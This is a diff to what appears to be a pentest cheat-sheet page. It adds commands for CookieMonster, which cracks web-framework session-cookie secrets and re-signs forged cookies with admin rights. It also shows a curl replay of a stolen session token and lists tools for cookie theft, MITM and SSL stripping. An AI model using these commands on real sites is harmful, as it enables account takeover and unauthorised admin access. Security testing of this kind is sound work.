@@ -232,13 +232,47 @@ curl -b "session=STOLEN_TOKEN" https://target.com/dashboard
 # grep -r "localStorage\|sessionStorage\|cookie" *.js
 # Look for: localStorage.setItem('token', response.token)</code></pre>
 
+  <h2>CookieMonster — Session Cookie Secret Cracking</h2>
+  <p>CookieMonster is a Go CLI tool that decodes and cracks vulnerable session cookies from Django, Flask, Laravel, Rack, Express, and raw JWTs. It brute-forces the HMAC secret key using a wordlist. Once the key is recovered, you can forge arbitrary session cookies with any user ID or role.</p>
+  <pre><code># Install:
+go install github.com/iangcarroll/cookiemonster/cmd/cookiemonster@latest
+
+# Basic usage — crack a cookie using the built-in wordlist (~39k keys):
+cookiemonster -cookie "gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I"
+# Output: ✅ Success! key is "changeme" (django decoder)
+
+# Crack cookie fetched directly from a URL (follows redirects, grabs Set-Cookie):
+cookiemonster -url "https://target.com/login"
+
+# Use a custom wordlist (entries must be base64-encoded):
+# Convert standard wordlist to CookieMonster format:
+while IFS= read -r line; do echo -n "$line" | base64; done &lt; /usr/share/wordlists/rockyou.txt &gt; rockyou_b64.txt
+cookiemonster -cookie "SESSION_COOKIE" -wordlist rockyou_b64.txt
+
+# Express (cookie-session) — pass cookie + signature separated by ^:
+# Headers: session=eyJhbmltYWxzIjoibGlvbiJ9  +  session.sig=Vf2INo...
+cookiemonster -cookie "session=eyJhbmltYWxzIjoibGlvbiJ9^Vf2INocdJIqKWVfYGhXwPhQZNFI"
+
+# Resign a forged cookie once the key is known:
+cookiemonster -cookie "ORIGINAL_COOKIE" -resign '{"user_id": 1, "is_admin": true}'
+# Output: new valid cookie signed with the cracked key
+
+# Supported frameworks:
+# Django     — value:timestamp:signature (base64)
+# Flask      — itsdangerous: value.timestamp.signature
+# Laravel    — AES-CBC encrypted base64 JSON
+# Rack       — BAh... (Marshal-encoded Ruby)
+# Express    — eyJ... JSON + .sig cookie
+# JWT        — HS256/384/512 HMAC tokens</code></pre>
+
   <h2>Tools</h2>
   <ul>
+    <li>CookieMonster — <code>github.com/iangcarroll/cookiemonster</code> — session cookie secret cracker</li>
+    <li>flask-unsign — <code>github.com/Paradoxis/Flask-Unsign</code> — Flask session cookie tool</li>
     <li>Burp Suite — session analysis, CSRF testing, repeater</li>
     <li>XSS Hunter — <code>xsshunter.trufflesecurity.com</code> — blind XSS for cookie theft</li>
     <li>bettercap — <code>bettercap.org</code> — MITM and session sniffing</li>
     <li>sslstrip — SSL stripping for HTTPS downgrade</li>
-    <li>CSRF PoC Generator — Burp Suite Pro generates CSRF PoC automatically</li>
     <li>JWT.io — <code>jwt.io</code> — decode and analyze JWT tokens</li>
   </ul>
 
